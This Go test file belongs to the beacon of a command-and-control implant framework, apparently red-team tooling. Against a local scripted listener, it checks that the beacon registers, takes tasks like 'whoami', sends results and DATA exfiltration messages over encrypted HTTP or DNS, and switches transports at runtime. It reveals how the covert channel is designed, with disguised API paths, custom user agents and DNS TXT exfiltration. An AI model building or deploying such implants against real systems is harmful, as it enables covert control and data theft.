package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"testing"
	"time"
)

// scriptedListener is a stand-in for a DNS server's HTTP listener that answers each
// operation from a table. Unlike the single-shot capture server used by the wire-shape
// tests, it serves repeatedly, which is what a beacon calling back needs.
type scriptedListener struct {
	addr string

	mu       sync.Mutex
	requests []capturedRequest
	// responses maps an operation ("register", "task", "result", "ack") to the protocol
	// message to return. An empty string answers 204 with no body.
	responses map[string]string
	// codec is the body codec both directions, matched to what a real listener uses.
	codec HTTPBodyCodec
	key   []byte
}

// newScriptedListener starts a listener that answers from responses.
func newScriptedListener(t *testing.T, responses map[string]string) *scriptedListener {
	t.Helper()

	socket, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to listen: %v", err)
	}
	t.Cleanup(func() { socket.Close() })

	listener := &scriptedListener{
		addr:      socket.Addr().String(),
		responses: responses,
		codec:     HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"},
		key:       nil, // set by the caller before use
	}

	go func() {
		for {
			conn, err := socket.Accept()
			if err != nil {
				return
			}
			go listener.serve(conn)
		}
	}()

	return listener
}

// serve answers one connection.
func (l *scriptedListener) serve(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	request, err := parseCapturedRequest(bufio.NewReader(conn))
	if err != nil {
		return
	}

	l.mu.Lock()
	l.requests = append(l.requests, request)
	response, known := l.responses[operationForPath(request.path)]
	l.mu.Unlock()

	if !known {
		conn.Write([]byte("HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"))
		return
	}

	if response == "" {
		conn.Write([]byte("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"))
		return
	}

	body, err := encodeHTTPBody(l.codec, response, l.key)
	if err != nil {
		return
	}
	conn.Write([]byte(fmt.Sprintf(
		"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		len(body), body)))
}

// seen returns the paths requested so far, in order.
func (l *scriptedListener) seen() []string {
	l.mu.Lock()
	defer l.mu.Unlock()

	paths := make([]string, 0, len(l.requests))
	for _, request := range l.requests {
		paths = append(paths, request.path)
	}
	return paths
}

// seenOperations returns the operations requested so far, in order.
func (l *scriptedListener) seenOperations() []string {
	operations := []string{}
	for _, path := range l.seen() {
		operations = append(operations, operationForPath(path))
	}
	return operations
}

// operationForPath maps a listener path back to an operation for the scripted server.
func operationForPath(path string) string {
	trimmed := path
	if index := strings.Index(trimmed, "?"); index >= 0 {
		trimmed = trimmed[:index]
	}
	switch trimmed {
	case "/api/v1/ping":
		return "register"
	case "/api/v1/sync":
		return "task"
	case "/api/v1/report":
		return "result"
	case "/api/v1/ack":
		return "ack"
	}
	return ""
}

// listenerConfigFor builds the beacon's view of a listener at addr.
func listenerConfigFor(addr string) HTTPListener {
	return HTTPListener{
		Name:   "scripted",
		Scheme: "http",
		Host:   addr,
		URIs: map[string][]string{
			"register": {"/api/v1/ping"},
			"task":     {"/api/v1/sync"},
			"result":   {"/api/v1/report"},
			"ack":      {"/api/v1/ack"},
		},
		Methods: map[string]string{
			"register": "POST",
			"task":     "GET",
			"result":   "POST",
			"ack":      "GET",
		},
		Headers:      []HTTPHeader{{Name: "Accept", Value: "application/json"}},
		UserAgents:   []string{"scripted/1.0"},
		RequestBody:  HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"},
		ResponseBody: HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"},
		Auth:         HTTPAuth{Mode: httpAuthModeHMAC, Header: "X-Sig", SigEncoding: "hex"},
		TimeoutSecs:  5,
	}
}

// newHTTPModeBeacon builds a beacon in HTTP mode whose DNS client cannot work.
//
// The DNS configuration deliberately names no domains, so any DNS C2 attempt fails
// immediately. That is what makes the tests below prove the traffic went over HTTP
// rather than merely prove it succeeded.
func newHTTPModeBeacon(t *testing.T, addr, mode string) (*Beacon, []byte) {
	t.Helper()

	const key = "http-mode-test-key"
	aesKey := generateAESKey(key)

	config := &Config{
		EncryptionKey: key,
		Timeout:       2,
		RetryAttempts: 1,
		BeaconName:    "httpmode",
		Transport:     mode,
		HTTPListeners: []HTTPListener{listenerConfigFor(addr)},
		// Registration and poll phases stay TXT so a DNS attempt would be visible as a
		// resolution failure rather than an A-record probe.
		Registration: PhaseConfig{QueryType: "TXT", Encrypted: true},
		Poll: PollPhaseConfig{
			PhaseConfig:   PhaseConfig{QueryType: "TXT", Encrypted: true, ARecordACKIP: "127.0.0.1"},
			ARecordTaskIP: "127.0.0.2",
		},
		DataExfil: PhaseConfig{QueryType: "TXT", Encrypted: true},
	}

	client := &DNSClient{
		config:        config,
		aesKey:        aesKey,
		lastDomain:    "",
		domainIndex:   0,
		failedDomains: make(map[string]time.Time),
		domainLatency: make(map[string]time.Duration),
		successCounts: make(map[string]int),
		failureCounts: make(map[string]int),
	}

	beacon := &Beacon{
		client:          client,
		id:              "httpmodebeacon",
		hostname:        "host1",
		username:        "user1",
		os:              "linux",
		arch:            "amd64",
		name:            "httpmode",
		transport:       newTransportManager(config, aesKey),
		vars:            make(map[string]string),
		executedTasks:   make(map[string]bool),
		executedMaxSize: 100,
	}

	return beacon, aesKey
}

// =============================================================================
// HTTP only
// =============================================================================

// TestHTTPOnlyMode_RegistersAndTasksOverHTTP proves a beacon can run with no DNS C2 at
// all: registration and tasking both arrive on listener paths, and the DNS client is
// configured so that any DNS attempt would fail.
func TestHTTPOnlyMode_RegistersAndTasksOverHTTP(t *testing.T) {
	server := newScriptedListener(t, map[string]string{
		"register": "ACK",
		"task":     "TASK|T500|whoami",
	})

	beacon, aesKey := newHTTPModeBeacon(t, server.addr, transportHTTP)
	server.key = aesKey

	if beacon.transport.Mode() != transportHTTP {
		t.Fatalf("mode = %q, want http", beacon.transport.Mode())
	}

	// Registration must go over HTTP, not DNS.
	response, err := beacon.checkIn()
	if err != nil {
		t.Fatalf("checkIn() error = %v", err)
	}
	if response != "ACK" {
		t.Fatalf("registration response = %q, want ACK", response)
	}
	if stage := beacon.regStage.Load(); stage != 3 {
		t.Fatalf("registration stage = %d, want 3 (complete)", stage)
	}

	// The task must also arrive over HTTP, with the task carried in the response.
	response, err = beacon.checkIn()
	if err != nil {
		t.Fatalf("poll error = %v", err)
	}
	if response != "TASK|T500|whoami" {
		t.Fatalf("poll response = %q, want the task", response)
	}

	// Every exchange landed on a listener path, and nothing else was attempted.
	operations := server.seenOperations()
	if len(operations) != 2 {
		t.Fatalf("listener saw %d requests (%v), want 2", len(operations), operations)
	}
	if operations[0] != "register" || operations[1] != "task" {
		t.Fatalf("listener saw %v, want [register task]", operations)
	}
}

// TestHTTPOnlyMode_NoDNSFallback asserts HTTP-only means HTTP-only: when the listener is
// gone the beacon reports the failure rather than quietly moving onto DNS. An operator who
// chose HTTP-only must not find half the protocol on DNS.
func TestHTTPOnlyMode_NoDNSFallback(t *testing.T) {
	// A listener address nothing is listening on.
	deadSocket, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	deadAddr := deadSocket.Addr().String()
	deadSocket.Close()

	beacon, _ := newHTTPModeBeacon(t, deadAddr, transportHTTP)

	if _, err := beacon.checkIn(); err == nil {
		t.Fatal("checkIn() succeeded with no reachable listener, so it fell back to DNS")
	}
}

// TestHTTPOnlyMode_ResultAndAckCarryNoDNS asserts the result phases are also HTTP-only,
// which is what makes the mode usable for a task that produces output.
func TestHTTPOnlyMode_ResultAndAckCarryNoDNS(t *testing.T) {
	server := newScriptedListener(t, map[string]string{
		"register": "ACK",
		"result":   "ACK",
		"ack":      "ACK",
	})

	beacon, aesKey := newHTTPModeBeacon(t, server.addr, transportHTTP)
	server.key = aesKey

	// Each result phase travels through the same seam the loop uses.
	for _, message := range []string{
		"RESULT_META|" + beacon.id + "|T500|12|1",
		"DATA|" + beacon.id + "|T500|1|1|ZGF0YQ==",
		"RESULT_COMPLETE|" + beacon.id + "|T500|1",
		"STATUS|" + beacon.id + "|active",
	} {
		if _, err := beacon.sendControlMessage(message, PhaseConfig{}); err != nil {
			t.Fatalf("sendControlMessage(%q) error = %v", message, err)
		}
	}

	operations := server.seenOperations()
	if len(operations) != 4 {
		t.Fatalf("listener saw %v, want four requests", operations)
	}
	for i, operation := range operations {
		if operation == "" {
			t.Fatalf("request %d did not match a listener path", i)
		}
	}
	if operations[0] != "result" || operations[1] != "result" || operations[2] != "result" {
		t.Errorf("result phases did not route to the result path: %v", operations)
	}
	if operations[3] != "ack" {
		t.Errorf("STATUS did not route to the ack path: %v", operations)
	}
}

// =============================================================================
// Runtime switching
// =============================================================================

// TestRuntimeSwitch_HTTPOnlyToDNSAndBack asserts a live beacon can be moved between
// transports and keeps calling back, which is the point of the runtime update channel.
func TestRuntimeSwitch_HTTPOnlyToDNSAndBack(t *testing.T) {
	server := newScriptedListener(t, map[string]string{
		"register": "ACK",
		"task":     "TASK|T600|hostname",
	})

	// Start DNS-only: no listener configured, so nothing can go over HTTP.
	beacon, aesKey := newHTTPModeBeacon(t, server.addr, transportDNS)
	server.key = aesKey

	if beacon.transport.Mode() != transportDNS || beacon.transport.ShouldUseHTTP() {
		t.Fatalf("expected to start in DNS mode, got %q", beacon.transport.Mode())
	}

	// A DNS-mode exchange must not touch the listener. The DNS client has no domains, so
	// this fails; the point is that it fails without an HTTP request being made.
	if _, err := beacon.sendControlMessage("POLL|"+beacon.id, PhaseConfig{}); err == nil {
		t.Fatal("a DNS-mode exchange succeeded, so it did not go over DNS")
	}
	if operations := server.seenOperations(); len(operations) != 0 {
		t.Fatalf("a DNS-mode beacon made HTTP requests: %v", operations)
	}

	// Switch to HTTP-only at runtime, exactly as an update_transport task would.
	update, err := json.Marshal(transportUpdate{
		Mode:                  transportHTTP,
		Listeners:             []HTTPListener{listenerConfigFor(server.addr)},
		FallbackAfterFailures: 3,
		RetryBackoffSecs:      60,
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := beacon.transport.ApplyUpdate(string(update)); err != nil {
		t.Fatalf("ApplyUpdate() error = %v", err)
	}

	// It keeps calling back, now over HTTP.
	if response, err := beacon.checkIn(); err != nil {
		t.Fatalf("checkIn() after switching to HTTP error = %v", err)
	} else if response != "ACK" {
		t.Fatalf("registration after switch = %q, want ACK", response)
	}
	if response, err := beacon.checkIn(); err != nil {
		t.Fatalf("poll after switching to HTTP error = %v", err)
	} else if response != "TASK|T600|hostname" {
		t.Fatalf("poll after switch = %q, want the task", response)
	}

	if operations := server.seenOperations(); len(operations) != 2 {
		t.Fatalf("listener saw %v, want two requests after the switch", operations)
	}

	// Switch back to DNS-only. The beacon must stop using HTTP immediately; the DNS
	// client here has no domains, so the exchange fails, which is what proves it
	// stopped using the listener rather than succeeding by accident.
	if err := beacon.transport.ApplyUpdate(`{"mode":"dns"}`); err != nil {
		t.Fatalf("ApplyUpdate(dns) error = %v", err)
	}
	if _, err := beacon.sendControlMessage("POLL|"+beacon.id, PhaseConfig{}); err == nil {
		t.Fatal("after switching back to DNS mode the beacon still completed the exchange over HTTP")
	}

	if operations := server.seenOperations(); len(operations) != 2 {
		t.Fatalf("listener saw %v, want no further requests after switching back", operations)
	}
}

// TestRuntimeSwitch_DualToHTTPOnly asserts dual mode can be narrowed to HTTP-only while
// the beacon is running, which is how an operator takes DNS out of the picture.
func TestRuntimeSwitch_DualToHTTPOnly(t *testing.T) {
	server := newScriptedListener(t, map[string]string{
		"register": "ACK",
		"task":     "ACK",
	})

	beacon, aesKey := newHTTPModeBeacon(t, server.addr, transportDual)
	server.key = aesKey

	if beacon.transport.Mode() != transportDual {
		t.Fatalf("mode = %q, want dual", beacon.transport.Mode())
	}

	// In dual mode with a healthy listener, tasking already goes over HTTP; the A-record
	// probe is the only DNS traffic, and it is skipped here because the poll phase is TXT.
	if _, err := beacon.checkIn(); err != nil {
		t.Fatalf("dual-mode checkIn() error = %v", err)
	}

	if err := beacon.transport.ApplyUpdate(`{"mode":"http","listeners":[` + mustJSON(t, listenerConfigFor(server.addr)) + `]}`); err != nil {
		t.Fatalf("ApplyUpdate(http) error = %v", err)
	}
	if beacon.transport.Mode() != transportHTTP {
		t.Fatalf("mode after update = %q, want http", beacon.transport.Mode())
	}

	before := len(server.seenOperations())
	if _, err := beacon.checkIn(); err != nil {
		t.Fatalf("checkIn() in HTTP-only error = %v", err)
	}
	if after := len(server.seenOperations()); after <= before {
		t.Fatal("the narrowed beacon stopped calling back")
	}
}

// TestRuntimeSwitch_RejectedUpdateKeepsCallingBack asserts an unusable payload cannot take
// a beacon off the transport it is still reachable on. Losing contact is unrecoverable
// from the control plane, so the failure has to be a no-op.
func TestRuntimeSwitch_RejectedUpdateKeepsCallingBack(t *testing.T) {
	server := newScriptedListener(t, map[string]string{
		"register": "ACK",
		"task":     "ACK",
	})

	beacon, aesKey := newHTTPModeBeacon(t, server.addr, transportHTTP)
	server.key = aesKey

	if _, err := beacon.checkIn(); err != nil {
		t.Fatalf("initial checkIn() error = %v", err)
	}

	for _, payload := range []string{
		`{"mode":"carrier-pigeon"}`,
		`{"mode":"http","listeners":[]}`,
		`{"mode":"http","listeners":[{"name":"broken"}]}`,
		`not json`,
		``,
	} {
		if err := beacon.transport.ApplyUpdate(payload); err == nil {
			t.Errorf("ApplyUpdate(%q) was accepted, want rejection", payload)
		}
	}

	// Still HTTP-only, still reachable.
	if beacon.transport.Mode() != transportHTTP {
		t.Fatalf("mode = %q, want http after rejected updates", beacon.transport.Mode())
	}

	before := len(server.seenOperations())
	if _, err := beacon.checkIn(); err != nil {
		t.Fatalf("checkIn() after rejected updates error = %v", err)
	}
	if after := len(server.seenOperations()); after <= before {
		t.Fatal("the beacon stopped calling back after a rejected update")
	}
}

// mustJSON renders a value as JSON for embedding in a payload.
func mustJSON(t *testing.T, value interface{}) string {
	t.Helper()
	encoded, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	return string(encoded)
}

// TestTransportUpdateVectorIsAccepted proves the payload Archon builds for a runtime
// transport switch is accepted by this beacon.
//
// Archon and this module are separate Go modules, so nothing but the field names joins
// them. Archon asserts its builder still produces exactly this document; this test
// asserts the beacon applies it. Together they cover the switch across the boundary,
// which is the part neither side can verify alone.
func TestTransportUpdateVectorIsAccepted(t *testing.T) {
	raw, err := os.ReadFile("../testdata/http_transport_vectors.json")
	if err != nil {
		t.Fatalf("failed to read the shared vectors: %v", err)
	}

	var vectors struct {
		HTTP json.RawMessage `json:"transport_update_http"`
		DNS  json.RawMessage `json:"transport_update_dns"`
	}
	if err := json.Unmarshal(raw, &vectors); err != nil {
		t.Fatalf("failed to parse the shared vectors: %v", err)
	}

	// Start DNS-only, as a beacon built before the operator's change would be.
	beacon, _ := newHTTPModeBeacon(t, "127.0.0.1:9", transportDNS)
	if beacon.transport.Mode() != transportDNS {
		t.Fatalf("setup failed: mode = %q, want dns", beacon.transport.Mode())
	}

	// The exact document Archon sends must switch it to HTTP-only.
	if err := beacon.transport.ApplyUpdate(string(vectors.HTTP)); err != nil {
		t.Fatalf("the beacon rejected Archon's transport update: %v", err)
	}
	if beacon.transport.Mode() != transportHTTP {
		t.Fatalf("mode = %q, want http", beacon.transport.Mode())
	}
	if !beacon.transport.ShouldUseHTTP() {
		t.Fatal("after the update the beacon still does not use HTTP")
	}

	// And the DNS-only document must switch it back, which is how an operator takes a
	// beacon off HTTP again.
	if err := beacon.transport.ApplyUpdate(string(vectors.DNS)); err != nil {
		t.Fatalf("the beacon rejected Archon's DNS transport update: %v", err)
	}
	if beacon.transport.Mode() != transportDNS {
		t.Fatalf("mode = %q, want dns", beacon.transport.Mode())
	}
	if beacon.transport.ShouldUseHTTP() {
		t.Fatal("after switching back to DNS the beacon still uses HTTP")
	}
}
